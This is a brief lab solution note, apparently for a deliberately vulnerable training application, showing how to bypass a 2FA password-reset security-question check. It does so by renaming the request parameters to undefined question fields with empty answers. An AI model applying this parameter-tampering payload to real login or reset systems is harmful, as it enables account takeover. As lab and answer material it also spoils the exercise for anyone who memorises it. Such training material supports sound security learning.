# (A2) Authentication bypasses

## Lesson 2 - 2FA Password Reset
Bypass security questions:
```
secQuestion0=aaa&secQuestion1=bbb&jsEnabled=...
```

Change query params to:
```
secQuestion7=secQuestion8=&jsEnabled=..
```
Answers for those questions are not defined (empty).
